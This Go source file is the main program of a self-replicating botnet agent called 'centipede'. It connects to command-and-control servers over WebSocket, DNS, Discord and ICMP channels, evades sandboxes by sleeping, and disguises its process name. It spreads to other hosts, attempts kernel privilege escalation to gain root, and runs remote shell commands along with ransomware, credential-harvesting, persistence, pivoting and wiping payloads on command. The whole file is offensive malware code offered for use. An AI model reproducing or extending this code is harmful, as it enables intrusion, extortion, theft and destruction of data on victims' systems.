package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/h0mi3e/centipede/internal/c2"
	"github.com/h0mi3e/centipede/internal/common"
	"github.com/h0mi3e/centipede/internal/exploiter"
	"github.com/h0mi3e/centipede/internal/payloads"
	"github.com/h0mi3e/centipede/internal/replicator"
	"github.com/h0mi3e/centipede/internal/scanner"
	"github.com/h0mi3e/centipede/internal/sensor"
)

type Config struct {
	C2Endpoint     string `json:"c2_endpoint"`
	C2DNSDomain    string `json:"c2_dns_domain"`
	C2DiscordToken string `json:"c2_discord_token"`
	C2DiscordChan  string `json:"c2_discord_channel"`
	C2ICMPTarget   string `json:"c2_icmp_target"`
	ScanInterval   int    `json:"scan_interval"`
	SpreadInterval int    `json:"spread_interval"`
	Exploit        bool   `json:"exploit"`
	Replication    bool   `json:"replication"`
	Masquerade     bool   `json:"masquerade"`
}

func defaultConfig() *Config {
	return &Config{
		ScanInterval:   300,
		SpreadInterval: 300,
		Exploit:        true,
		Replication:    true,
		Masquerade:     true,
	}
}

func main() {
	configPath := flag.String("config", "/etc/centipede.conf", "Config file path")
	c2Endpoint := flag.String("c2", "", "C2 WebSocket endpoint")
	c2DNS := flag.String("c2-dns", "", "C2 DNS domain for tunnel")
	c2DiscordTok := flag.String("c2-discord-token", "", "Discord bot token")
	c2DiscordChan := flag.String("c2-discord-channel", "", "Discord channel ID")
	c2ICMP := flag.String("c2-icmp", "", "C2 ICMP tunnel target")
	noExploit := flag.Bool("no-exploit", false, "Disable exploit attempts")
	noSpread := flag.Bool("no-spread", false, "Disable self-replication")
	debug := flag.Bool("debug", false, "Enable debug output")
	version := flag.Bool("version", false, "Show version")
	flag.Parse()

	if *version {
		fmt.Printf("centipede v0.1.0\n")
		return
	}

	if *debug {
		log.SetFlags(log.LstdFlags | log.Lshortfile)
	} else {
		log.SetOutput(os.NewFile(0, os.DevNull))
	}

	rand.Seed(time.Now().UnixNano())

	botID := fmt.Sprintf("%s-%s-%d",
		strings.ReplaceAll(common.GetHostname(), ".", "-"),
		common.RandomString(8), os.Getpid())

	// Check sandbox
	if isSandboxed() {
		if *debug {
			log.Printf("[centipede] sandbox detected, sleeping")
		}
		time.Sleep(30 * time.Minute)
	}

	// Load config
	cfg := defaultConfig()
	if data, err := os.ReadFile(*configPath); err == nil {
		json.Unmarshal(data, cfg)
	}
	if *c2Endpoint != "" {
		cfg.C2Endpoint = *c2Endpoint
	}
	if *c2DNS != "" {
		cfg.C2DNSDomain = *c2DNS
	}
	if *c2DiscordTok != "" {
		cfg.C2DiscordToken = *c2DiscordTok
	}
	if *c2DiscordChan != "" {
		cfg.C2DiscordChan = *c2DiscordChan
	}
	if *c2ICMP != "" {
		cfg.C2ICMPTarget = *c2ICMP
	}
	if *noExploit {
		cfg.Exploit = false
	}
	if *noSpread {
		cfg.Replication = false
	}

	// Masquerade
	if cfg.Masquerade {
		os.Args[0] = common.RandomExeName()
	}

	// Environment sensor
	env := sensor.Gather()

	// Start C2
	c2Client := c2.NewC2Client(
		botID, cfg.C2Endpoint, cfg.C2DNSDomain,
		cfg.C2DiscordToken, cfg.C2DiscordChan, cfg.C2ICMPTarget,
	)
	if cfg.C2Endpoint != "" || cfg.C2DNSDomain != "" || cfg.C2DiscordToken != "" {
		c2Client.Start()
		defer c2Client.Stop()
	}

	// Start scanner
	scan := scanner.NewScanner()
	scan.Start()
	defer scan.Stop()

	// Start replicator
	var rep *replicator.Replicator
	if cfg.Replication {
		rep = replicator.New()
		rep.Start()
		defer rep.Stop()
	}

	// Attempt LPE
	if cfg.Exploit && os.Geteuid() != 0 {
		go doExploit(env)
	}

	// Task processing loop
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		processTasks(c2Client)
	}()

	// Wait for signal
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
}

func doExploit(env *sensor.EnvInfo) {
	exp := exploiter.New()
	ki := exp.DetectKernel()
	if ki == nil {
		return
	}
	log.Printf("[centipede] attempting LPE (kernel %s)", ki.Release)
	results := exp.Find(ki)
	for _, r := range results {
		if r.Success && r.Root {
			log.Printf("[centipede] root via %s", r.Name)
			exe, _ := os.Readlink("/proc/self/exe")
			if exe != "" {
				syscall.Exec(exe, os.Args, os.Environ())
			}
			break
		}
	}
}

func processTasks(c *c2.C2Client) {
	for task := range c.Tasks() {
		go func(t c2.Task) {
			var args map[string]string
			if len(t.Args) > 0 {
				json.Unmarshal(t.Args, &args)
			}

			var output string
			var err error

			switch t.Action {
			case "exec", "shell":
				output, err = runShell(args)
			case "payload":
				name := args["name"]
				if name != "" {
					output, err = payloads.Run(name, args)
				}
			case "enum":
				output, err = payloads.Run("enum", args)
			case "harvest":
				output, err = payloads.Run("harvest", args)
			case "persist":
				output, err = payloads.Run("persist", args)
			case "pivot":
				output, err = payloads.Run("pivot", args)
			case "ransomware":
				output, err = payloads.Run("ransomware", args)
			case "ransomware_decrypt":
				output, err = payloads.Run("ransomware_decrypt", args)
			case "wipe":
				output, err = payloads.Run("wipe", args)
			case "selfdestruct":
				payloads.Run("selfdestruct", args)
				return
			case "sleep":
				dur, parseErr := time.ParseDuration(args["duration"])
				if parseErr == nil && dur > 0 {
					time.Sleep(dur)
				}
				output = "slept"
			default:
				output, err = runShell(map[string]string{"cmd": t.Action})
			}

			result := c2.TaskResult{
				TaskID:  t.ID,
				Success: err == nil,
				Output:  output,
			}
			if err != nil {
				result.Error = err.Error()
			}
			c.SendResult(result)
		}(task)
	}
}

func runShell(args map[string]string) (string, error) {
	cmd := args["cmd"]
	if cmd == "" {
		cmd = args["command"]
	}
	if cmd == "" {
		return "", fmt.Errorf("no command specified")
	}

	shell := "/bin/sh"
	if args["shell"] != "" {
		shell = args["shell"]
	}

	out, err := exec.Command(shell, "-c", cmd).CombinedOutput()
	return string(out), err
}

func isSandboxed() bool {
	if os.Getenv("DETECTED") != "" {
		return true
	}
	if runtime.NumCPU() <= 1 {
		data, _ := os.ReadFile("/proc/cpuinfo")
		if len(data) < 500 {
			return true
		}
	}
	return false
}
